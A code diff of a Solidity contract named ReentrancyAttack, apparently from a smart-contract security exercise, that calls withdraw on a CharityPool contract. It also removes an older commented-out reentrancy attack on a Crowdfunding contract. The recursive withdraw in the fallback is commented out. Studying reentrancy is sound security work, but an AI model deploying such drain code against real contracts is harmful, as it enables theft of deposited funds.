@@ -6,6 +6,8 @@ import './CharityPool.sol';
 
 contract ReentrancyAttack {
 
+    uint8 public MIN_CHARITY_BALANCE = 4;
+    uint256 public WEI_SCALE = 10**18;
 
     CharityPool public charityPool;
 
@@ -13,28 +15,20 @@ contract ReentrancyAttack {
         charityPool = CharityPool(_charityPool);
     }
 
+    function getContractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+
+    // Callback function to continue the attack.
+    function() external payable {
+        if (address(charityPool).balance >= MIN_CHARITY_BALANCE * WEI_SCALE) {
+            //charityPool.withdraw();
+        }
+    }
+
+    function initiateAttack() public {
+        charityPool.withdraw();
+    }
 
 }
-
-
-// contract MaliciousContract {
-//     Crowdfunding public crowdfunding;
-
-//     constructor(address _crowdfundingAddress) {
-//         crowdfunding = Crowdfunding(_crowdfundingAddress);
-//     }
-
-//     fallback() external payable {
-//         if (address(crowdfunding).balance >= 1 ether) {
-//             crowdfunding.withdraw(1 ether);
-//         }
-//     }
-
-//     function initiateAttack() public {
-//         crowdfunding.withdraw(1 ether);
-//     }
-
-//     function getBalance() public view returns (uint) {
-//         return address(this).balance;
-//     }
-// }
